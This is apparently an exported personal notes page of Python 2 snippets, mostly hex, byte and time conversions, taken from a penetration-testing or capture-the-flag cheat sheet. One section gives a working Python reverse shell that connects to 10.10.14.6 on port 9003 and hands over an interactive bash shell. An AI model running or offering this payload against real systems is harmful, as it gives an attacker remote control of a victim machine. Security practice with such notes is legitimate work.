<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Snippets</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1>#Python snippets</h1></strong><br />Snippets of python<br /><br /><strong><h2>## Get date/time from server in linux epoch time</h2></strong><br /><div class="codebox"><div class="codebox">import&nbsp;requests<br />import&nbsp;datetime<br /><br />r&nbsp;=&nbsp;requests.get(&quot;http://example.com&quot;)<br /><br />#get&nbsp;current&nbsp;time&nbsp;of&nbsp;server<br />currentServerTime&nbsp;=&nbsp;int((datetime.datetime.strptime(r.headers[&#39;date&#39;],&nbsp;&quot;%a,&nbsp;%d&nbsp;%b&nbsp;%Y&nbsp;%H:%M:%S&nbsp;%Z&quot;)&nbsp;-&nbsp;datetime.datetime(1970,1,1)).total_seconds())<br />#print&nbsp;out&nbsp;times<br />print&nbsp;&quot;Current&nbsp;server&nbsp;time:&nbsp;&quot;&nbsp;+str<span style="color:#000000;font-weight:400">(</span>currentServerTime<span style="color:#000000;font-weight:400">)</span></div></div><br /><br /><strong><h2>## Convert hex to bytes</h2></strong><br /><a href="https://old.reddit.com/r/learnpython/comments/6a85ge/hex_to_little_endian/">https://old.reddit.com/r/learnpython/comments/6a85ge/hex_to_little_endian/</a><br />Use the <code>int.to_bytes</code> method.<br /><div class="codebox"><div class="codebox">&gt;&gt;&gt;&nbsp;hexnum&nbsp;=&nbsp;0xffffabcd<br />&gt;&gt;&gt;&nbsp;hexnum.to_bytes(4,&nbsp;&#39;little&#39;)<br />b&#39;\xcd\xab\xff\xff&#39;</div></div><br /><br /><strong><h2>## Modify environment variable in Python script</h2></strong><br />Example is for python2<br />from here - <a href="https://www.youtube.com/watch?v=eFzYISSiheM">https://www.youtube.com/watch?v=eFzYISSiheM</a><br /><div class="codebox"><div class="codebox">os.environ[&#39;HOME&#39;]&nbsp;=&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>value<span style="color:#000000;font-weight:400">&gt;</span></div></div><br /><br /><strong><h2>## Python Reverse Shell</h2></strong><h2> - python2</h2><br /><div class="codebox"><div class="codebox">import&nbsp;os,&nbsp;socket,&nbsp;subprocess<br />s&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)<br />s.connect((&#39;10.10.14.6&#39;,&nbsp;9003))<br />os.dup2(s.fileno(),0)<br />os.dup2(s.fileno(),1)<br />os.dup2(s.fileno(),2)<br />p&nbsp;=&nbsp;subprocess.call<span style="color:#000000;font-weight:400">(</span>[&#39;/bin/bash&#39;,&nbsp;‘-i’]<span style="color:#000000;font-weight:400">)</span></div></div><br /><br /><strong><h2>## decimal to hex</h2></strong><h2> - python 2</h2><br />There&#39;s 2 ways to convert a decimal value to hex<br /><code>hex()</code> and <code>format()</code><br /><div class="codebox"><div class="codebox">dec&nbsp;=&nbsp;246040<br />decHex&nbsp;=&nbsp;hex(dec)<br />decFormat&nbsp;=&nbsp;format<span style="color:#000000;font-weight:400">(</span>dec,&nbsp;&#39;x&#39;<span style="color:#000000;font-weight:400">)</span></div></div><br /><code>format()</code> has worked better for me in the past.<br /><br /><strong><h2>## hex decode</h2></strong><h2> - python 2</h2><br /><div class="codebox"><div class="codebox">str(&lt;HEX&nbsp;NUMBER&gt;).decode<span style="color:#000000;font-weight:400">(</span>&#39;hex&#39;<span style="color:#000000;font-weight:400">)</span></div></div></div>
</body>
</html>
